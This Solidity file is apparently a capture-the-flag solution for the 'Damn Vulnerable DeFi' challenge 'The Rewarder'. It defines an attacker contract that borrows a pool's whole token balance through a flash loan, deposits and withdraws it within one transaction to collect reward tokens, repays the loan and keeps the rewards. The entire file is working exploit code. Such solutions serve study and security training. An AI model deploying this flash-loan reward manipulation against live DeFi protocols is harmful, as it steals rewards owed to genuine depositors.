// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(address _pool, address _token, address _rewardPool, address _reward) {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        uint256 borrowAmount = token.balanceOf(address(this));
        token.approve(address(rewardPool), borrowAmount);
        rewardPool.deposit(borrowAmount);
        rewardPool.withdraw(borrowAmount);
        token.transfer(address(pool), borrowAmount);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}